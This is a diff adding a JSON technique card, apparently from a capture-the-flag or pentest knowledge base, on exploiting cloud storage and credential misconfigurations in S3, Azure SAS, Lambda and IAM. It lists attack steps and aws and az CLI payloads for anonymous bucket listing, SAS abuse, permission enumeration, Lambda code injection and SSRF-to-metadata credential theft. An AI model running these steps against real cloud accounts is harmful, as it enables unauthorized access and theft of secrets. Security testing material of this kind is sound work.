@@ -1,0 +1,60 @@
+{
+  "id": "cloud-s3-sas-misconfig",
+  "title": "云对象存储/凭证配置错误（S3 ACL / Azure SAS / Lambda env）",
+  "vuln_pattern": "公有可读桶、过权 SAS token、Lambda 环境变量泄密、可 assume 的过权角色",
+  "fingerprint": [
+    "s3",
+    "bucket",
+    "acl",
+    "public read",
+    "sas token",
+    "azure storage",
+    "lambda",
+    "iam",
+    "assume role",
+    "对象存储",
+    "cloudvault",
+    "aws",
+    "gcp",
+    "存储桶",
+    "访问令牌",
+    "预签名",
+    "配置错误",
+    "云凭据",
+    "sas"
+  ],
+  "exploit_steps": [
+    "S3：aws s3 ls s3://<bucket> --no-sign-request 试匿名列举；能列则下载敏感对象/flag",
+    "Azure SAS：解析 SAS URL 权限位(sp=racwdl)，若含 l/r 列举+下载容器内 blob；权限过大则写入",
+    "拿到临时凭证：aws sts get-caller-identity 看身份→enumerate-iam/cloudfox 枚举权限→找可读 secret / 可 assume 的角色链",
+    "Lambda：读函数配置/环境变量(常含 DB 密码/密钥)；能改则注入代码",
+    "顺链：SSRF→元数据取 role 凭证→S3/Secrets Manager 读 flag"
+  ],
+  "key_payloads": [
+    "aws s3 ls s3://<bucket> --no-sign-request",
+    "aws s3 cp s3://<bucket>/flag.txt - --no-sign-request",
+    "aws sts get-caller-identity ; aws secretsmanager list-secrets",
+    "az storage blob list --account-name <a> --container-name <c> --sas-token '<sas>'"
+  ],
+  "category": "cloud",
+  "cve": [],
+  "tags": [
+    "cloud",
+    "s3",
+    "azure",
+    "sas",
+    "lambda",
+    "iam"
+  ],
+  "source": "original: v2 technique card",
+  "created_ts": 0.0,
+  "preconditions": [
+    "拿到某云端点/桶名/SAS URL/临时凭证(常经 SSRF 元数据或泄露获得)"
+  ],
+  "verify_oracle": "匿名/凭证成功列举或下载到对象内容(flag/secret)；sts 返回有效身份",
+  "pitfalls": [
+    "区域(region)不对会报错——先探对区域",
+    "--no-sign-request 只对公有桶；私有需凭证",
+    "SAS 权限位决定能做什么，先解析再动手"
+  ]
+}
